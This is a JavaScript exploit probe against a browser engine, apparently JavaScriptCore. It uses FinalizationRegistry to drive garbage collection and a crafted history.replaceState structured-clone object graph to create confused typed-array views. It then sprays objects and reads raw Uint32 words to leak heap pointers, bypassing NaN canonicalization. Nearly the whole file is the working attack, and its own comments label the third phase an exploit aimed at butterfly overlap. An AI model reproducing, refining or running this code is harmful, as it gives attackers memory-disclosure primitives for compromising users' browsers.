// Async GC probe — targeted FR callback + heap reuse
// Runs as a Promise chain that the debug server evaluates
(function() {
'use strict';

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

function u32ToHex(hi, lo) {
  return '0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0');
}

function hexDump(view, off, len) {
  var h = '';
  for (var i = off; i < Math.min(off + len, view.length); i++)
    h += view[i].toString(16).padStart(2, '0');
  return h;
}

return new Promise(function(resolve) {
  var phases = [];
  var DONE = false;

  function finish(result) {
    if (DONE) return;
    DONE = true;
    result.phases = phases;
    resolve(JSON.stringify(result));
  }

  // ─── Phase 1: Trigger GC and detect via FR ───
  var frFired = false;
  var frCount = 0;
  var fr = new FinalizationRegistry(function(tag) {
    frCount++;
    if (!frFired) {
      frFired = true;
      phases.push('fr_first_fire_' + tag);
      runPhase2();
    }
  });

  // Register disposable objects
  (function() {
    for (var i = 0; i < 50; i++) {
      var obj = { idx: i, buf: new ArrayBuffer(128) };
      fr.register(obj, 'wave1_' + i);
    }
  })();
  // All 50 objects are now unreachable (only fr weak refs remain)

  phases.push('registered_50');

  // GC pressure in waves — moderate, not OOM
  function gcWave() {
    var tmp = [];
    for (var i = 0; i < 30; i++) tmp.push(new ArrayBuffer(2048));
    tmp = null;
    // String churn
    for (var i = 0; i < 100; i++) {
      var s = 'x'.repeat(500) + i;
    }
    // Array churn
    for (var i = 0; i < 50; i++) {
      var a = new Array(100);
      for (var j = 0; j < 100; j++) a[j] = { k: j };
    }
  }

  // Run multiple GC waves
  var waveCount = 0;
  var maxWaves = 20;

  function doWave() {
    if (DONE) return;
    waveCount++;
    gcWave();

    if (frFired) return; // Phase 2 will take over

    if (waveCount < maxWaves) {
      setTimeout(doWave, 50);
    } else {
      phases.push('max_waves_no_fr');
      // Try phase 2 anyway even without FR confirmation
      runPhase2();
    }
  }

  // ─── Phase 2: Heap reuse test with confused views ───
  var phase2Ran = false;
  function runPhase2() {
    if (phase2Ran) return;
    phase2Ran = true;
    phases.push('phase2_start_frFired=' + frFired + '_frCount=' + frCount);

    // Test A: Read Uint32 (not Float64) to avoid NaN canonicalization
    // If we ever get object data into a buffer, Uint32 gives raw bits
    var target = new ArrayBuffer(64);
    var tv = new Uint8Array(target);
    tv.fill(0x41);
    var source = new ArrayBuffer(64);
    new Uint8Array(source).fill(0x42);
    var s1 = new Uint8Array(source);
    var s2 = new Uint8Array(source);

    var filler = [1n, target, s1, s2];
    while (filler.length < 80) filler.push({ p: filler.length });
    var ref = {};
    var outer = new Array(83);
    outer[0] = filler;
    outer[1] = ref;
    outer[2] = ref;
    outer[82] = -1;

    history.replaceState(outer, '');
    var c = history.state;
    history.replaceState(null, '');

    if (!c || !(c[0][3] instanceof Uint8Array) || c[0][3][0] !== 0x41) {
      finish({ result: 'phase2_confusion_failed' });
      return;
    }

    var cv = c[0][3];

    // Write a tagged pointer pattern and read via Uint32 (bypasses NaN canon)
    var dv = new DataView(cv.buffer);
    // Write what a JSC object pointer might look like: 0x0000_0001_2345_6780
    dv.setUint32(0, 0x23456780, true); // low 32
    dv.setUint32(4, 0x00000001, true); // high 32

    var u32 = new Uint32Array(cv.buffer);
    var lo = u32[0];
    var hi = u32[1];
    var f64 = new Float64Array(cv.buffer);
    var asDouble = f64[0];

    var testA = {
      u32_lo: '0x' + lo.toString(16).padStart(8, '0'),
      u32_hi: '0x' + hi.toString(16).padStart(8, '0'),
      u32_raw: u32ToHex(hi, lo),
      f64_read: f64ToHex(asDouble),
      nan_bypassed: f64ToHex(asDouble) !== '0x7ff8000000000000',
      matches: lo === 0x23456780 && hi === 0x00000001
    };

    // Test B: Write an integer-tagged value and read via Uint32
    dv.setUint32(0, 0xDEADBEEF, true);
    dv.setUint32(4, 0xFFFF0000, true); // integer tag

    var intLo = u32[0];
    var intHi = u32[1];
    var intF64 = f64[0];

    var testB = {
      u32_lo: '0x' + intLo.toString(16).padStart(8, '0'),
      u32_hi: '0x' + intHi.toString(16).padStart(8, '0'),
      u32_raw: u32ToHex(intHi, intLo),
      f64_read: f64ToHex(intF64),
      u32_preserves_nan: intHi === 0xFFFF0000 && intLo === 0xDEADBEEF,
      f64_canonicalized: f64ToHex(intF64) === '0x7ff8000000000000'
    };

    // Test C: Use the confused view in a Worker context
    // Create a Worker that reads the buffer and sends back raw bytes
    try {
      var workerCode = [
        'self.onmessage = function(e) {',
        '  var u32 = new Uint32Array(e.data);',
        '  var result = [];',
        '  for (var i = 0; i < u32.length; i++) result.push(u32[i]);',
        '  self.postMessage(result);',
        '};'
      ].join('\n');
      var blob = new Blob([workerCode], { type: 'application/javascript' });
      var w = new Worker(URL.createObjectURL(blob));

      // Clone (not transfer) the buffer to the worker
      w.onmessage = function(e) {
        w.terminate();

        var workerRead = e.data;
        var testC = {
          workerGotData: workerRead.length > 0,
          workerU32_0: '0x' + (workerRead[0] >>> 0).toString(16).padStart(8, '0'),
          workerU32_1: '0x' + (workerRead[1] >>> 0).toString(16).padStart(8, '0'),
          matchesMain: workerRead[0] === intLo && workerRead[1] === intHi
        };

        runPhase3(cv, c, testA, testB, testC);
      };

      w.onerror = function(e) {
        w.terminate();
        runPhase3(cv, c, testA, testB, { workerError: e.message || 'unknown' });
      };

      // Send a COPY of the buffer (not transfer)
      w.postMessage(cv.buffer.slice(0));
    } catch(e) {
      runPhase3(cv, c, testA, testB, { workerError: e.message });
    }
  }

  // ─── Phase 3: Exploit the confused view for butterfly overlap ───
  function runPhase3(cv, clone, testA, testB, testC) {
    phases.push('phase3_start');

    // Attempt: Repeatedly clone+confuse, then spray objects, then read
    // The key insight: SC deserialization creates TEMPORARY ArrayBuffers
    // that get freed when the clone result is discarded. If those temp
    // buffers' data regions get reused by object butterflies...

    var ROUNDS = 5;
    var leaks = [];

    for (var round = 0; round < ROUNDS; round++) {
      // Create many SC confused views, keep them
      var views = [];
      for (var batch = 0; batch < 10; batch++) {
        var tgt = new ArrayBuffer(64);
        new Uint8Array(tgt).fill(round * 10 + batch);
        var s = new ArrayBuffer(64);
        new Uint8Array(s).fill(0);
        var sv1 = new Uint8Array(s);
        var sv2 = new Uint8Array(s);

        var f = [1n, tgt, sv1, sv2];
        while (f.length < 80) f.push({ p: f.length });
        var r = {};
        var o = new Array(83);
        o[0] = f;
        o[1] = r;
        o[2] = r;
        o[82] = -1;

        try {
          history.replaceState(o, '');
          var cc = history.state;
          history.replaceState(null, '');
          if (cc && cc[0][3] instanceof Uint8Array) {
            views.push(cc[0][3]);
          }
        } catch(e) {}
      }

      // Drop the clone results but keep the views
      // The views keep their buffers alive

      // GC wave
      gcWave();

      // Spray objects with distinct properties
      var sentinel = { SENTINEL: round };
      var objs = [];
      for (var i = 0; i < 100; i++) {
        var ob = {};
        ob.a = sentinel;
        ob.b = 3.14 + round;
        ob.c = sentinel;
        ob.d = 2.718 + round;
        ob.e = sentinel;
        ob.f = 1.414 + round;
        ob.g = sentinel;
        ob.h = 9.99 + round;
        objs.push(ob);
      }

      // Read confused views via Uint32 (bypasses NaN canonicalization)
      for (var vi = 0; vi < views.length; vi++) {
        var v = views[vi];
        var expected = round * 10 + vi;
        try {
          var u32v = new Uint32Array(v.buffer);
          for (var ui = 0; ui < u32v.length; ui++) {
            var val = u32v[ui];
            // Check for anything other than the expected fill pattern
            var expectedU32 = expected | (expected << 8) | (expected << 16) | (expected << 24);
            if (val !== expectedU32 >>> 0 && val !== 0) {
              leaks.push({
                round: round,
                viewIdx: vi,
                u32Idx: ui,
                val: '0x' + (val >>> 0).toString(16).padStart(8, '0'),
                expected: '0x' + (expectedU32 >>> 0).toString(16).padStart(8, '0')
              });
              if (leaks.length >= 20) break;
            }
          }
        } catch(e) {}
        if (leaks.length >= 20) break;
      }
      if (leaks.length >= 20) break;
    }

    finish({
      result: leaks.length > 0 ? 'LEAK_FOUND' : 'no_leaks',
      testA: testA,
      testB: testB,
      testC: testC,
      frFired: frFired,
      frCount: frCount,
      leaks: leaks.slice(0, 10)
    });
  }

  // Start GC waves
  setTimeout(doWave, 10);

  // Safety timeout
  setTimeout(function() {
    finish({ result: 'global_timeout', frFired: frFired, frCount: frCount });
  }, 15000);
});
})();
